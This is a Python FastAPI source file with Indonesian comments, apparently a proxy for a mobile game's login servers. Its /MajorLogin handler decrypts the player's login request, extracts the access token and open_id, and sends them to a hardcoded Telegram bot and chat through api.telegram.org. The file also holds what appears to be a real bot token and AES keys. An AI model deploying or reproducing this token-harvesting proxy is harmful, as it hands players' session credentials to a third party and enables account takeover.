import os
import json
import httpx
import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, Response
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *  # pastikan file x7m.py ada

app = FastAPI()

# Baca dari environment variables (wajib diset di Vercel)
TOKEN = os.getenv("8822285495:AAHLYHZDWqT6TspWuBGxYfZkxnnGl5furuw")
CHAT_ID = os.getenv("6513583182")

if not TOKEN or not CHAT_ID:
    print("WARNING: TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID tidak diset, pesan tidak akan dikirim.")

Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()

def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

@app.api_route("/ver.php", methods=["GET", "POST"])
async def manual(request: Request):
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in ("host", "content-length", "connection")
    }
    async with httpx.AsyncClient(follow_redirects=True) as client:
        r = await client.request(
            request.method,
            target,
            params=dict(request.query_params),
            headers=headers,
            content=await request.body()
        )
    data = r.json()
    # Ganti dengan domain Vercel Anda
    data["server_url"] = "https://proxy-cgu.vercel.app"  # sesuaikan

    HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate',
                  'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
    response_headers = {
        k: v for k, v in r.headers.items()
        if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding")
    }
    return JSONResponse(content=data, status_code=r.status_code, headers=response_headers)

@app.api_route("/MajorLogin", methods=["POST"])
async def MajorLoginProxy(request: Request):
    try:
        print('major!')
        PyL = await request.body()
        if not PyL:
            return Response(status_code=400, content="Empty body")

        # Decrypt dan parse
        decrypted = decrypt_api(PyL.hex())
        parsed = json.loads(get_available_room(decrypted))
        acess_token = parsed.get("29", "")
        open_id = parsed.get("22", "")

        if not acess_token or not open_id:
            print("Token atau open_id tidak ditemukan dalam response")
        else:
            print("Sending To Telegram Bot ..")
            ff = f"""Access Token : {acess_token} .
Open_id : {open_id} .

By : CONVERTGAMINGUID
CGU PROXY."""
            if TOKEN and CHAT_ID:
                try:
                    r = requests.post(
                        f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                        params={'chat_id': CHAT_ID, 'text': ff}
                    )
                    if r.status_code == 200:
                        print('Sent Info !')
                    else:
                        print(f'Failed To Send ! status: {r.status_code}')
                except Exception as e:
                    print(f"Error sending Telegram: {e}")
            else:
                print("Telegram credentials missing, skipping send.")

        # Respons yang diharapkan game (status 500)
        nikomLhnoud = f""" [b][c][279CF5]














─────────────────────────────────────

[cccccc]access Token => [ff0000]{acess_token} [cccccc]| open id => [00ff00]{open_id}

[00ff00] CONVERTGAMINGUID




















                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    """
        return Response(content=nikomLhnoud, status_code=500, media_type="application/octet-stream")

    except Exception as e:
        print(f"Error in MajorLogin: {e}")
        # Jangan crash, tetap balas dengan respons kosong tapi status 500
        return Response(status_code=500, content="Error")
